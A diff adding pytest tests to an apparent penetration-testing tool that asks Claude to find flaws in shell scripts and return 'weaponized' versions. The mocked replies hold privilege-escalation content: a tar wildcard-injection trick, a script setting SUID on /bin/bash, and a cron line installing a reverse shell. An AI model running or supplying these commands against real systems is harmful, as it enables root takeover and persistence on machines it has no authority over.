@@ -5,7 +5,7 @@ import pytest
 from pathlib import Path
 sys.path.insert(0, str(Path.home() / "Tools"))
 
-from ttpx import extract_snippet, extract_title, find_matches, ask_claude, source_label, strip_markdown, extract_section, mirror_file, log_payload_result, _content_root, _recently_changed_dirs, HACKTRICKS_PATH, PATT_PATH, MAX_PAYLOAD_MATCHES, parse_raw_request, generate_csrf_poc, ask_claude_csrf_bypass, detect_csrf_tokens, display_csrf_poc
+from ttpx import extract_snippet, extract_title, find_matches, ask_claude, source_label, strip_markdown, extract_section, mirror_file, log_payload_result, _content_root, _recently_changed_dirs, HACKTRICKS_PATH, PATT_PATH, MAX_PAYLOAD_MATCHES, parse_raw_request, generate_csrf_poc, ask_claude_csrf_bypass, detect_csrf_tokens, display_csrf_poc, ask_claude_script, display_script_result, log_script_result
 from unittest.mock import patch, MagicMock
 
 
@@ -1142,6 +1142,82 @@ def test_ask_claude_csrf_bypass_prompt_contains_token_context():
     assert "token_field" not in prompt
     # focus instruction must steer towards specific bypass families
     assert "stripping" in prompt or "leaking" in prompt or "manipulation" in prompt.lower()
+
+
+# --script: ask_claude_script tests
+
+def test_ask_claude_script_returns_parsed_json():
+    import json
+    mock_response = MagicMock()
+    mock_response.content = [MagicMock(text=json.dumps({
+        "vulnerabilities": [
+            {"name": "Wildcard injection in tar", "severity": "critical", "line": 14,
+             "detail": "tar czf /tmp/backup.tar.gz * is exploitable via checkpoint files."}
+        ],
+        "exploitation": "Drop a file named --checkpoint-action=exec=sh shell.sh in the backup dir.",
+        "weaponization_strategy": "adds SUID to /bin/bash on execution",
+        "language": "bash",
+        "weaponized_script": "#!/bin/bash\nchmod u+s /bin/bash\n",
+    }))]
+    mock_response.usage = MagicMock(input_tokens=200, output_tokens=150)
+
+    with patch("anthropic.Anthropic") as mock_cls:
+        mock_client = MagicMock()
+        mock_cls.return_value = mock_client
+        mock_client.messages.create.return_value = mock_response
+        result = ask_claude_script("#!/bin/bash\ntar czf /tmp/backup.tar.gz *", "backup.sh")
+
+    assert len(result["vulnerabilities"]) == 1
+    assert result["vulnerabilities"][0]["severity"] == "critical"
+    assert result["weaponization_strategy"] == "adds SUID to /bin/bash on execution"
+    assert result["weaponized_script"] == "#!/bin/bash\nchmod u+s /bin/bash\n"
+    assert "_usage" in result
+    call_kwargs = mock_client.messages.create.call_args[1]
+    assert call_kwargs["model"] == "claude-sonnet-4-6"
+    assert call_kwargs["max_tokens"] == 4096
+
+
+def test_ask_claude_script_includes_details_in_prompt():
+    import json
+    mock_response = MagicMock()
+    mock_response.content = [MagicMock(text=json.dumps({
+        "vulnerabilities": [],
+        "exploitation": "n/a",
+        "weaponization_strategy": "installs cron reverse shell",
+        "language": "bash",
+        "weaponized_script": "#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/rs.sh'; } | crontab -\n",
+    }))]
+    mock_response.usage = MagicMock(input_tokens=100, output_tokens=80)
+
+    with patch("anthropic.Anthropic") as mock_cls:
+        mock_client = MagicMock()
+        mock_cls.return_value = mock_client
+        mock_client.messages.create.return_value = mock_response
+        ask_claude_script(
+            "#!/bin/bash\necho hello",
+            "monitor.sh",
+            details=["runs as root via cronjob", "world-writable"]
+        )
+
+    prompt = mock_client.messages.create.call_args[1]["messages"][0]["content"]
+    assert "runs as root via cronjob" in prompt
+    assert "world-writable" in prompt
+
+
+def test_ask_claude_script_handles_malformed_json():
+    mock_response = MagicMock()
+    mock_response.content = [MagicMock(text="not valid json at all")]
+    mock_response.usage = MagicMock(input_tokens=10, output_tokens=5)
+
+    with patch("anthropic.Anthropic") as mock_cls:
+        mock_client = MagicMock()
+        mock_cls.return_value = mock_client
+        mock_client.messages.create.return_value = mock_response
+        result = ask_claude_script("#!/bin/bash\necho hi", "test.sh")
+
+    assert result["vulnerabilities"] == []
+    assert result["language"] == "text"
+    assert "not valid json" in result["weaponized_script"]
 
 
 def test_ask_claude_csrf_bypass_no_token_prompt_focuses_on_defences():
